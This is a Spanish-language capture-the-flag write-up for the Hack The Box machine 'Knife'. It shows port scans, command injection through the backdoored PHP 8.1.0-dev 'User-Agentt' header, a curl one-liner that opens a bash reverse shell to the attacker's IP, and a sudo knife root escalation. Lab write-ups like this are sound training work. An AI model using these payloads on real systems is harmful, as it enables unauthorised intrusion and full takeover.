---
layout: single
title: Knife - Hack The Box
excerpt: "Esta es una máquina muy fácil, vamos a aprovecharnos de una vulnerabilidad en la versión de PHP 8.0.1-dev que nos permitirá conectarnos de manera remota como el usuario James, una vez dentro, vamos a investigar los privilegios que tenemos, encontrando que podemos usar el binario Knife, buscamos en la página GTFObins y nos explica una forma para convertirnos en Root."
date: 2023-05-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-knife/knife_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - PHP
  - Remote Code Execution (RCE)
  - RCE - PHP 8.0.1-dev
  - Abusing Sudoers Privilege
  - Abusing Knife Binary
  - OSCP Style
---
![](/assets/images/htb-writeup-knife/knife_logo.png)

Esta es una máquina muy fácil, vamos a aprovecharnos de una vulnerabilidad en la versión de **PHP 8.0.1-dev** que nos permitirá conectarnos de manera remota como el usuario **James**, una vez dentro, vamos a investigar los privilegios que tenemos, encontrando que podemos usar el **binario Knife**, buscamos en la página **GTFObins** y nos explica una forma para convertirnos en **Root**.

Herramientas utilizadas:
* *nmap*
* *wappalizer*
* *whatweb*
* *wget*
* *nc*
* *python3*
* *curl*
* *html2text*
* *sudo*
* *knife*


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
				<li><a href="#Fuzz">Fuzzing</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Exploit">Buscando un Exploit para PHP</a></li>
				<ul>
					<li><a href="#Exploit2">Probando Exploit: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution</a></li>
					<li><a href="#Exploit3">Inyectando Comandos con Cabecera 'User-Agentt' y curl</a></li>
				</ul>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#Enum">Enumeración de Máquina y Escalando Privilegios con Binario</a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<style>
	#backToIndex {
        	display: none;
		position: fixed;
		left: 87%;
		top: 90%;
		z-index: 2000;
		background-color: #81fbf9;
		border-radius: 10px;
		border: none;
		padding: 4px 6px;
		cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
	<img src="/assets/images/htb-writeup-knife/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
	window.onscroll = function() {showButton()};

	function showButton() {
	const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
	const indicePosition = document.getElementById("Indice").offsetTop;

	if (scrollPosition >= indicePosition) {
		document.getElementById("backToIndex").style.display = "block";
	} else {
		document.getElementById("backToIndex").style.display = "none";
		}
	}
</script>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.10.242
PING 10.10.10.242 (10.10.10.242) 56(84) bytes of data.
64 bytes from 10.10.10.242: icmp_seq=1 ttl=63 time=188 ms
64 bytes from 10.10.10.242: icmp_seq=2 ttl=63 time=341 ms
64 bytes from 10.10.10.242: icmp_seq=3 ttl=63 time=140 ms
64 bytes from 10.10.10.242: icmp_seq=4 ttl=63 time=189 ms

--- 10.10.10.242 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 139.758/214.254/340.532/75.560 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.242 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 13:03 CST
Initiating SYN Stealth Scan at 13:03
Scanning 10.10.10.242 [65535 ports]
Discovered open port 22/tcp on 10.10.10.242
Discovered open port 80/tcp on 10.10.10.242
Completed SYN Stealth Scan at 13:03, 26.71s elapsed (65535 total ports)
Nmap scan report for 10.10.10.242
Host is up, received user-set (1.3s latency).
Scanned at 2023-05-10 13:03:13 CST for 26s
Not shown: 52975 filtered tcp ports (no-response), 12558 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.81 seconds
           Raw packets sent: 125074 (5.503MB) | Rcvd: 12589 (503.600KB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo solamente dos puertos abiertos, todo apunta a que debemos analizar el puerto 80, veamos que nos dice el escaneo de servicios.

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sC -sV -p22,80 10.10.10.242 -oN targeted                           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 13:05 CST
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 13:06 (0:00:06 remaining)
Nmap scan report for 10.10.10.242
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be549ca367c315c364717f6a534a4c21 (RSA)
|   256 bf8a3fd406e92e874ec97eab220ec0ee (ECDSA)
|_  256 1adea1cc37ce53bb1bfb2b0badb3f684 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.69 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

No veo información que nos sirva útil, analicemos la página web.


<br>
<br>
<hr>
<div style="position: relative;">
	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos.

<p align="center">
<img src="/assets/images/htb-writeup-knife/Captura1.png">
</p>

La página se ve simple, los campos que tiene no funcionan, veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-knife/Captura2.png">
</p>

Muy bien está programado en **PHP**, veamos que nos dice la herramienta **whatweb**:
```bash
whatweb http://10.10.10.242/                                                                                          
http://10.10.10.242/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```
Me llama la atención esto: **X-Powered-By[PHP/8.1.0-dev]**, puede que nos sirva después.

Revise el código fuente, pero no encontré nada que nos pueda ayudar, así que no lo pondré aquí.

Antes de buscar un Exploit, vamos a hacer un **Fuzzing** para ver si encontramos una subpágina que nos sea útil.

<h2 id="Fuzz">Fuzzing</h2>

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.242/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.242/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000083:   200        220 L    526 W      5815 Ch     "icons"                                                               
000045240:   200        220 L    526 W      5815 Ch     "http://10.10.10.242//"                                               
000095524:   403        9 L      28 W       277 Ch      "server-status"                                                       

Total time: 531.9833
Processed Requests: 220560
Filtered Requests: 220543
Requests/sec.: 414.5994
```

| Parámetros | Descripción |
|--------------------------|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

<br>

Veamos que nos reporta **gobuster**:
```bash
gobuster dir -u http://10.10.10.242/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.242/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
Progress: 220485 / 220547 (99.97%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

<br>

Nada, quiero pensar que la movida será por la versión del **PHP**, vamos a buscar un Exploit.


<br>
<br>
<hr>
<div style="position: relative;">
	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="Exploit">Buscando un Exploit para PHP</h2>

Encontré un Exploit para la versión que está usando la página web:
* https://www.exploit-db.com/exploits/49933
 
En resumen, la versión de PHP 8.1.0-dev tiene una **Backdoor** que al parecer alguien dejo ahí, por lo que cualquier atacante puede usar esta **Backdoor** utilizando la cabecera **User-Agentt** (que esto fue lo que delato la **Backdoor**). Y este exploit se aprovecha de esto para otorgar una shell en el host.

Para que no pierdas el tiempo como yo, esta versión del Exploit no nos servirá, el mismo autor creó una **Reverse Shell**, usando el mismo Exploit. 

Esta versión la encontramos en su **GitHub**:
* https://github.com/flast101/php-8.1.0-dev-backdoor-rce

<br>

<h3 id="Exploit2">Probando Exploit: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution</h3>

Vamos a descargar solamente la versión **Reverse Shell**:
```bash
wget https://raw.githubusercontent.com/flast101/php-8.1.0-dev-backdoor-rce/main/revshell_php_8.1.0-dev.py             
--2023-05-10 14:24:23--  https://raw.githubusercontent.com/flast101/php-8.1.0-dev-backdoor-rce/main/revshell_php_8.1.0-dev.py
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)
Conectando con raw.githubusercontent.com (raw.githubusercontent.com) conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2318 (2.3K) [text/plain]
Grabando a: «revshell_php_8.1.0-dev.py»

revshell_php_8.1.0-dev.py         100%[============================================================>]   2.26K  --.-KB/s    en 0s      

2023-05-10 14:24:23 (60.6 MB/s) - «revshell_php_8.1.0-dev.py» guardado [2318/2318]
```

Si usamos el parámetro **-h**, nos explicará como usarlo:
```bash
python3 revshell_php_8.1.0-dev.py -h
usage: revshell_php_8.1.0-dev.py [-h] <target URL> <attacker IP> <attacker PORT>

Get a reverse shell from PHP 8.1.0-dev backdoor. Set up a netcat listener in another shell: nc -nlvp <attacker PORT>

positional arguments:
  <target URL>     Target URL
  <attacker IP>    Attacker listening IP
  <attacker PORT>  Attacker listening port

options:
  -h, --help       show this help message and exit
```

Necesitamos una **netcat**, activemos una:
```bash
nc -nvlp 443                   
listening on [any] 443 ...
```

Ahora, usa el Exploit:
```bash
python3 revshell_php_8.1.0-dev.py http://10.10.10.242 10.10.14.5 443
```

Y ve la **netcat**:
```bash
nc -nvlp 443                   
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.242] 42246
bash: cannot set terminal process group (899): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ whoami
whoami
james
```

Te recomiendo sacar una **shell interactiva** y después de que lo hagas busca la flag:
```bash
james@knife:~$ cd /home
james@knife:/home$ ls
james
james@knife:/home$ cd james
james@knife:~$ ls
user.txt
james@knife:~$ cat user.txt
...
```

<br>

<h3 id="Exploit3">Inyectando Comandos con Cabecera 'User-Agentt' y curl</h3>

Como ya vimos que se esta ocupado la cabecera de **User-Agentt** para inyectar una **Reverse Shell**, también podemos hacerlo nosotros sin necesidad del Exploit. Esto es similar a hacer una prueba en la cabecera **User-Agent** con tal de ver si no es vulnerable al **ataque Shellshock**.

Vamos a probar por pasos:
* Ocupa el siguiente comando de **curl**, vamos a agregarle el comando **html2text** para ver como se representa el código fuente en texto en lugar de mostrar todo el código:

```bash
curl -s -X GET http://10.10.10.242 | html2text
    * About EMA
    * /
    * Patients
    * /
    * Hospitals
    * /
    * Providers
    * /
    * E-MSO
*
***** At EMA we're taking care to a whole new level . . . *****
****** Taking care of our  ******
```
El parámetro **-s** es para que la petición sea silenciosa y el parámetro **-X** es para introducir el metodo de la petición, que en este caso sería una petición **GET**.

* Utiliza el parámetro **-H** para introducir la cabecera **User-Agent** en **curl**, justo como viene en el Exploit y escribe el comando **whoami** entre comillas simples:

```bash
curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('whoami');" | html2text
james
    * About EMA
    * /
    * Patients
    * /
    * Hospitals
    * /
    * Providers
    * /
    * E-MSO
*
***** At EMA we're taking care to a whole new level . . . *****
****** Taking care of our  ******
```

* Ahora probemos con el comando **id**:

```bash
curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('id');" | html2text
uid=1000(james) gid=1000(james) groups=1000(james)
    * About EMA
    * /
    * Patients
    * /
    * Hospitals
    * /
    * Providers
    * /
    * E-MSO
*
***** At EMA we're taking care to a whole new level . . . *****
****** Taking care of our  ******
```
Tenemos un resultado exitoso, ahora vamos a obtener la shell.

* Abre una **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

* Ocupa el mismo comando de **curl**, pero introduce nuestra **Reverse Shell** de confianza en **bash**, debemos escapar las comillas dobles o si no estaría interpretando otra cosa:
```bash
curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/Tu_IP/443 0>&1\"');" | html2text
```

* Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IṔ] from (UNKNOWN) [10.10.10.242] 39480
bash: cannot set terminal process group (1020): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ whoami
whoami
james
james@knife:/$ id
id
uid=1000(james) gid=1000(james) groups=1000(james)
james@knife:/$
```
Recuerda hacer interactiva esta shell.

¡Listo! Tenemos la flag del usuario, ahora, veamos como escalar privilegios.


<br>
<br>
<hr>
<div style="position: relative;">
	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id="Enum">Enumeración de Máquina y Escalando Privilegios con Binario</h2>

Veamos qué privilegios tenemos:
```bash
james@knife:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Resulta que esto es un binario, veamos que nos dice nuestra biblia **GTFObins** sobre este binario:
* https://gtfobins.github.io/gtfobins/knife/

Nos explica una forma de como escalar privilegios, vamos a probarlo:
```bash
james@knife:~$ sudo knife exec -E 'exec "/bin/sh"'
# whoami
root
```

a...bueno, busquemos la flag:
```bash
# cd /root
# ls
delete.sh  root.txt  snap
# cat root.txt
...
```
Muy bien, ya completamos la máquina.


<br>
<br>
<div style="position: relative;">
	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


* https://www.exploit-db.com/exploits/49933
* https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
* https://github.com/flast101/php-8.1.0-dev-backdoor-rce
* https://gtfobins.github.io/gtfobins/knife/


<br>
# FIN
